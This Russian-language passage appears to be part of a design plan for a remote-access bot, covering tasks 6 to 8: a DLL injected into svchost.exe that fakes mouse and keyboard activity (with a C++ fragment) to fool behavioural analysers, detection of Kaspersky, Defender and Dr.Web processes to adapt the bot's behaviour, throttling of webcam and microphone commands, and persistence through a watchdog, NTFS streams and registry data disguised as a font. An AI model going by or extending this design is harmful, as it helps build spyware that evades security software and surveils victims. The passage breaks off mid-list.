Задача 6: Эмуляция легитимной активности

Цель: Обмануть поведенческие анализаторы, которые ищут долгое бездействие с последующим выполнением команд.

Реализация:

· Внедрённая DLL (в svchost.exe) запускает отдельный поток, который имитирует действия пользователя:
  · Использует keybd_event и mouse_event для случайных нажатий в фоновых окнах (например, в окне блокнота, если он открыт).
  · Периодически переключает окна (через SetForegroundWindow), но только если пользователь не активен (проверяем GetLastInputInfo).
  · Читает и записывает ключи реестра в HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer (имитация обычной активности).
· Интенсивность эмуляции настраивается: при обнаружении антивируса увеличивается частота имитации.

Фрагмент (C++):

void EmulateActivity() {
    // Проверка бездействия пользователя
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    GetLastInputInfo(&lii);
    DWORD idleTime = GetTickCount() - lii.dwTime;
    if (idleTime > 60000) { // если пользователь не активен 1 минуту
        // Случайное движение мыши
        SetCursorPos(rand() % 1920, rand() % 1080);
        // Имитация нажатия клавиши (например, F15, не влияет на работу)
        keybd_event(VK_F15, 0, 0, 0);
        keybd_event(VK_F15, 0, KEYEVENTF_KEYUP, 0);
    }
}

Задача 7: Динамическое обнаружение антивирусов и адаптация

Цель: Изменить поведение системы, если обнаружено защитное ПО.

Реализация:

· Функция DetectAV() (на C++) проверяет:
  · Список запущенных процессов на наличие известных антивирусных (например, avp.exe, msmpeng.exe, dwengine.exe).
  · Наличие файлов в Program Files по характерным путям.
  · Наличие драйверов (sys) с определёнными именами.
· Возвращает битовую маску (Kaspersky, Defender, Dr.Web, etc.).
· В Python-боте:
  · Если обнаружен антивирус:
    · Увеличиваем задержки между командами (5-10 секунд вместо мгновенного ответа).
    · Отключаем команды с высоким риском (/webcam, /mic) или выполняем их только через браузер-прокси.
    · Включаем эмуляцию активности на максимальную частоту.
    · Периодически переименовываем мьютексы и пайпы.

Задача 8: Самовосстановление и устойчивость

Цель: Гарантировать, что после любых попыток удаления или завершения бот снова будет активен.

Механизмы:

1. Watchdog в системном процессе (описан выше) перезапускает бота при его завершении.
2. Множественные точки сохранения:
   · Зашифрованный образ бота хранится не только в NTFS потоке, но и в реестре (в виде бинарных данных под видом шрифта).
